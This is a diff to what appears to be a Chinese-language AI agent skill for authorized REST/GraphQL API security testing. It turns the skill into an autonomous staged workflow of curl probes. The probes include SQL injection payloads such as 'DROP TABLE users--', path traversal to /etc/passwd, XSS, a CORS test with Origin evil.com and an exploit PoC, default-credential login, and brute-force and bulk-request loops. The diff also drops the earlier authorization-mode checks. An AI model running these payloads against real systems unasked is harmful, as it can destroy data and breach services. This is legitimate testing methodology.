@@ -20,6 +20,8 @@ trigger:
     - "api 漏洞"
     - "安全报告"
     - "安全发现"
+    - "全流程测试"
+    - "完整测试"
   # 触发模式（正则）
   patterns:
     - "(?:帮我)?(?:进行?|做)(?:api|接口|rest|graphql|安全|渗透)?(?:测试|审计|检测|扫描|评估)"
@@ -35,134 +37,338 @@ trigger:
 
 针对授权目标进行结构化的 REST/GraphQL API 安全评估。
 
-## 触发条件
+## 核心原则
 
-当用户提到以下内容时自动触发：
-- 安全相关关键词（安全测试、漏洞检测等）
-- API 相关关键词（api、rest、graphql、swagger、openapi）
-- 报告生成请求
+1. **全流程覆盖**: 初始探测 → 资产发现 → 漏洞验证 → 报告生成
+2. **自主决策**: Agent 根据发现自动选择下一步行动
+3. **迭代深入**: 发现新线索时返回上一步深入探测
+4. **工具联动**: 根据目标类型选择合适的探测工具
 
-## 工作流程
+## 阶段决策引擎
 
-### 1. 确认输入和评估模式
+### 阶段 0: 初始化 (自动执行)
 
-**触发后自动执行**：
+**触发条件**: Skill 被激活后立即执行
+
+**执行动作**:
 ```markdown
-识别用户提供的内容：
-- [ ] 目标 URL 或 base URL
-- [ ] OpenAPI / Swagger 规范
-- [ ] GraphQL schema
-- [ ] 认证方式
-- [ ] 测试账号
+1. [ ] 检查目标可访问性
+2. [ ] 识别前端技术栈
+3. [ ] 识别 Web 服务器类型
+4. [ ] 选择探测策略
 ```
 
-**评估模式判断**：
-- 文档驱动审查：只有规范可用
-- 被动审查：存在目标但认证受限
-- 主动评估：授权明确
+**决策点**:
+| 发现特征 | 选择策略 |
+|---------|---------|
+| Vue/React/Angular SPA | → 启用无头浏览器 + JS 分析 |
+| 静态 HTML | → 目录扫描 + 指纹识别 |
+| 直接返回 JSON | → API 指纹识别 |
+| GraphQL | → GraphQL 专用探测 |
 
-参考：`references/intake.md`
+---
 
-### 2. 自动构建资产摘要
+### 阶段 1: 目标探测与资产发现
 
-**自动提取**：
-- [ ] 解析 URL 获取 API 端点
-- [ ] 分析 Swagger/OpenAPI 发现隐藏端点
-- [ ] 识别认证方式（Bearer/JWT/Session）
-- [ ] 识别信任边界
+**触发条件**: 阶段 0 完成后自动触发
 
-```markdown
-## 资产摘要
-- Base URLs:
-- API 类型:
-- 认证方案:
-- 高风险端点:
+**执行动作**:
+
+#### 1.1 基础探测
+```bash
+# HTTP 头探测
+curl -s -I http://target/
+
+# 识别服务器类型
+curl -s http://target/ | grep -iE "(server:|nginx|apache|tomcat)"
 ```
 
-参考：`references/asset-discovery.md`
+#### 1.2 SPA 检测与 JS 分析 (分支 A)
+**触发条件**: 发现 HTML 返回 Vue/React 特征或 SPA 迹象
 
-### 3. 自动构建测试矩阵
+```bash
+# 启用无头浏览器
+npm install -g puppeteer
 
-**自动生成测试用例**：
-```markdown
-| 测试项 | 优先级 | 测试方法 |
-|-------|---------|---------|
-| SQL注入 | Critical | 参数化查询验证 |
-| 认证绕过 | Critical | Token/JWT 分析 |
+# 使用浏览器探测
+node -e "
+const puppeteer = require('puppeteer');
+(async () => {
+  const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
+  const page = await browser.newPage();
+  await page.goto('http://target/', { waitUntil: 'networkidle2' });
+  
+  // 捕获所有网络请求
+  page.on('request', req => {
+    if (req.url().includes('/api/') || req.url().includes('/prod-api/')) {
+      console.log('[API] ' + req.method() + ' ' + req.url());
+    }
+  });
+  
+  // 提取 JS 文件
+  const scripts = await page.evaluate(() => 
+    Array.from(document.querySelectorAll('script[src]')).map(s => s.src)
+  );
+  console.log('Scripts:', scripts);
+  
+  await browser.close();
+})();
+"
 ```
 
-参考：`references/test-matrix.md`
+#### 1.3 API 路径发现
+```bash
+# 常见 API 路径探测
+curl -s http://target/api/ -H "Accept: application/json"
+curl -s http://target/prod-api/ -H "Accept: application/json"
+curl -s http://target/v1/api/ -H "Accept: application/json"
+curl -s http://target/api/v1/ -H "Accept: application/json"
 
-### 4. 漏洞验证和分类
-
-**自动判断严重性**：
-```markdown
-| 级别 | 标准 |
-|------|------|
-| Critical | 未授权访问 |
-| High | 权限绕过 |
-| Medium | 信息泄露 |
-| Low | 配置问题 |
+# 从 JS 文件提取 API 配置
+curl -s http://target/static/js/app.*.js | grep -oE '(baseURL|base_url|apiUrl)[^;]{0,100}'
 ```
 
-参考：`references/validation.md`
+**迭代触发条件**:
+- 发现 `baseURL: "/prod-api"` → 返回阶段 1.4 深入探测
+- 发现 `/api/` 路径 → 返回阶段 1.4 端点枚举
+- 发现 Swagger/OpenAPI → 进入阶段 2
 
-### 5. 生成结构化报告
-
-**自动填充模板**：
-```markdown
-## 发现
-### Finding 1: [标题]
-**严重性**: Critical
-**置信度**: High
-**影响资产**: /api/users/{id}
+#### 1.4 端点枚举
+```bash
+# 探测常见端点
+for endpoint in /user /users /admin /login /auth /api /menu /role /system /config; do
+  curl -s -I "http://target$endpoint" --max-time 5
+done
 ```
 
-参考：`references/report-template.md`
+---
 
-### 6. 测试循环迭代
+### 阶段 2: 认证与授权测试
 
-**当发现新的攻击面或需要深入验证时，循环执行以下步骤**：
+**触发条件**: 发现 API 端点后自动触发
 
-```
-循环条件：
-- 发现新的端点或参数 → 返回步骤 2
-- 发现新的认证机制 → 返回步骤 3
-- 需要验证假设 → 返回步骤 4
-- 发现新的风险类型 → 更新测试矩阵
+**执行动作**:
 
-循环终止条件：
-- 所有发现已验证
-- 测试矩阵已完整覆盖
-- 用户确认完成评估
+#### 2.1 CORS 配置检测
+```bash
+# 测试 CORS 配置
+curl -s -i "http://target/api/" -H "Origin: http://evil.com" | grep -iE "access-control"
 ```
 
-**循环流程**：
+**决策点**:
+| CORS 响应 | 风险等级 | 行动 |
+|-----------|---------|------|
+| `Access-Control-Allow-Origin: *` | High | 记录配置问题 |
+| `Access-Control-Allow-Origin: http://evil.com` + `allow-credentials: true` | **Critical** | 立即报告 CORS 漏洞 |
+| 无 CORS 头 | Low | 继续其他测试 |
+
+#### 2.2 登录接口测试
+```bash
+# 测试登录接口
+curl -s "http://target/prod-api/login" -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"admin"}'
+
+# 检查响应信息泄露
+# 如果返回 "用户不存在" → 信息枚举漏洞
+# 如果返回 "密码错误" → 信息枚举漏洞
+# 如果返回统一消息 → 良好实践
 ```
-[步骤 2: 资产摘要] 
-       ↓
-[步骤 3: 测试矩阵] → 发现新资产 → 返回步骤 2
-       ↓
-[步骤 4: 漏洞验证] → 需要深入验证 → 返回步骤 4
-       ↓
-[步骤 5: 生成报告] → 发现新风险 → 更新矩阵 → 返回步骤 3
-       ↓
-    [循环结束]
+
+#### 2.3 暴力攻击防护检测
+```bash
+# 连续发送多个请求测试速率限制
+for i in {1..10}; do
+  curl -s "http://target/prod-api/login" -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":"wrong"}'
+done
+# 检查是否有验证码或锁定机制
 ```
+
+#### 2.4 认证端点发现
+```bash
+# 探测公开认证端点
+curl -s "http://target/prod-api/captcha" -I
+curl -s "http://target/prod-api/public/captcha" -I
+curl -s "http://target/prod-api/auth/captcha" -I
+curl -s "http://target/prod-api/ws/info"
+curl -s "http://target/prod-api/license/valid"
+```
+
+**迭代触发条件**:
+- 发现 `/ws/info` 公开访问 → 记录敏感端点泄露
+- 发现 `/license/valid` 公开访问 → 记录配置泄露
+- 发现 CORS 漏洞 → 直接进入阶段 4.1
+
+---
+
+### 阶段 3: 漏洞验证
+
+**触发条件**: 阶段 2 完成或发现新资产后触发
+
+**执行动作**:
+
+#### 3.1 SQL 注入测试
+```bash
+# 参数测试
+curl -s "http://target/api/user?id=1' OR '1'='1"
+curl -s "http://target/api/user?id=1; DROP TABLE users--"
+
+# Header SQL 注入
+curl -s "http://target/api/list" -H "X-User-ID: 1' OR '1'='1"
+```
+
+#### 3.2 XSS 测试
+```bash
+curl -s "http://target/api/search?q=<script>alert(1)</script>"
+```
+
+#### 3.3 认证绕过测试
+```bash
+# 空 Token
+curl -s "http://target/api/user/info" -H "Authorization: "
+
+# 伪造 Token
+curl -s "http://target/api/user/info" -H "Authorization: Bearer fake_token"
+
+# JWT 绕过测试
+curl -s "http://target/api/user/info" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+```
+
+#### 3.4 路径遍历测试
+```bash
+curl -s "http://target/api/file?path=../../etc/passwd"
+curl -s "http://target/api/download?file=/etc/passwd"
+```
+
+#### 3.5 信息泄露检测
+```bash
+# 错误信息泄露
+curl -s "http://target/api/nonexistent"
+curl -s "http://target/api/error"
+
+# 调试端点
+curl -s "http://target/api/debug"
+curl -s "http://target/actuator"
+curl -s "http://target/actuator/health"
+
+# Swagger 暴露
+curl -s "http://target/swagger-ui.html"
+curl -s "http://target/v3/api-docs"
+```
+
+---
+
+### 阶段 4: 深度测试 (可选)
+
+**触发条件**: 基础测试完成后或时间允许
+
+#### 4.1 CORS 漏洞利用验证
+如果发现 CORS 配置错误，验证是否可以利用：
+```javascript
+// 构造恶意页面验证
+const exploit = `
+<html>
+<body>
+<script>
+fetch('http://target/api/user/info', {
+  credentials: 'include'
+}).then(r => r.json()).then(console.log);
+</script>
+</body>
+</html>
+`;
+console.log('CORS Exploit PoC:', exploit);
+```
+
+#### 4.2 WebSocket 安全测试
+```bash
+# 检查 WebSocket 升级
+curl -s -i "http://target/api/ws/info"
+# 测试 WS 连接
+```
+
+#### 4.3 业务逻辑测试
+```bash
+# 密码重置测试
+curl -s "http://target/api/forget" -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","email":"admin@test.com"}'
+
+# 批量操作限制测试
+for i in {1..100}; do
+  curl -s "http://target/api/create" -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"data":"test"}'
+done
+```
+
+---
+
+### 阶段 5: 报告生成
+
+**触发条件**: 测试完成或用户确认结束
+
+**自动执行**:
+1. 汇总所有发现
+2. 按严重性排序
+3. 生成完整报告
+
+---
+
+## 决策树
+
+```
+开始测试
+    ↓
+阶段0: 初始化
+    ↓
+发现 Vue/React SPA? ─否→ 静态探测
+    ↓是→ 启用无头浏览器
+    ↓
+阶段1: 资产发现
+    ↓
+发现 API 端点? ─否→ 继续探测
+    ↓是↓
+阶段2: 认证测试
+    ↓
+发现 CORS 漏洞? ─是→ 立即记录 → 继续测试
+    ↓否
+发现登录接口? ─是→ 测试暴力防护
+    ↓否
+阶段3: 漏洞验证
+    ↓
+SQLi → XSS → Auth Bypass → Path Traversal
+    ↓
+阶段5: 报告
+```
+
+---
+
+## 工具选择指南
+
+| 场景 | 推荐工具 | 用途 |
+|------|---------|------|
+| SPA 应用探测 | puppeteer | 动态加载 JS、捕获 API 调用 |
+| 静态站点探测 | curl + grep | 快速指纹识别 |
+| API 端点发现 | curl + ffuf | 路径爆破 |
+| 认证测试 | burp suite / curl | 登录和会话测试 |
+| 漏洞验证 | burp suite / sqlmap | 深度漏洞测试 |
+
+---
 
 ## 严重性校准
-
-**完整标准参考**：`references/severity-model.md`
 
 ### 严重性级别
 
 | 级别 | 触发条件 | 示例 |
 |------|----------|------|
-| Critical | 直接导致未授权访问或数据泄露 | 认证绕过、SQL注入导致数据库泄露 |
-| High | 可导致权限提升或用户数据访问 | IDOR、垂直越权、API密钥泄露 |
-| Medium | 可导致有限影响或信息泄露 | 敏感信息暴露、账户枚举 |
-| Low | 影响有限的信息披露或配置问题 | 调试头暴露、版本信息泄露 |
-| Informational | 非安全问题，最佳实践建议 | 文档改进建议 |
+| Critical | 直接导致未授权访问或账户劫持 | CORS + credentials、SQL注入 |
+| High | 可导致权限提升或用户数据访问 | IDOR、垂直越权、敏感端点泄露 |
+| Medium | 可导致有限影响或信息泄露 | 信息枚举、暴力防护缺失 |
+| Low | 影响有限的信息披露 | 调试头暴露、版本信息泄露 |
+| Informational | 非安全问题 | 最佳实践建议 |
 
 ### 置信度级别
 
@@ -174,32 +380,7 @@ trigger:
 | Low | 弱指标 | 单一响应 |
 | Hypothesis | 理论推断 | 需要进一步调查 |
 
-### 校准原则
-
-1. **保守校准**：证据不确定时，倾向较低严重性
-2. **基于影响**：考虑真实世界影响
-3. **可利用性**：考虑利用难度和前提条件
-4. **业务上下文**：考虑受影响资产的价值
-
-## 协议处理
-
-### REST API
-
-**自动检测**：
-- 路径参数 `/users/{id}`
-- 查询参数 `?page=1&limit=10`
-- Header 认证 `Authorization: Bearer xxx`
-
-参考：`references/rest-guidance.md`
-
-### GraphQL
-
-**自动检测**：
-- Query/Mutation 分析
-- 字段级权限
-- 嵌套遍历风险
-
-参考：`references/graphql-guidance.md`
+---
 
 ## 输出格式
 
@@ -215,14 +396,15 @@ trigger:
 
 ## Asset Summary
 - Base URLs:
-- API Type: [REST/GraphQL/混合]
+- API Type: [REST/GraphQL/SPA+API]
+- Tech Stack: [识别的技术栈]
 - Auth Schemes: [认证方式]
 - Discovered Endpoints: [端点列表]
 - Sensitive Objects: [敏感对象]
-- Trust Boundaries: [信任边界]
 
 ## Test Matrix
-| Category | Test Item | Priority | Status |
+| Category | Test Item | Priority | Status | Finding |
+|----------|----------|----------|--------|---------|
 
 ## Findings
 ### Finding N: [标题]
@@ -237,15 +419,23 @@ trigger:
 
 ## Coverage Gaps
 | Gap | Impact | Recommendation |
+|-----|--------|-----------------|
 
 ## Overall Risk Summary
 | Risk Level | Count | Findings |
 |------------|-------|----------|
 ```
 
-### 报告质量要求
+---
 
-- **Evidence**：必须包含请求/响应样本
-- **Reproduction**：清晰的复现步骤
-- **Remediation**：具体可操作的修复建议
-- **Coverage Gaps**：明确说明未覆盖区域及原因
+## 参考文档
+
+| 阶段 | 参考文档 |
+|------|---------|
+| 资产发现 | `references/asset-discovery.md` |
+| 测试矩阵 | `references/test-matrix.md` |
+| 输入验证 | `references/validation.md` |
+| 严重性校准 | `references/severity-model.md` |
+| REST API | `references/rest-guidance.md` |
+| GraphQL | `references/graphql-guidance.md` |
+| 报告模板 | `references/report-template.md` |
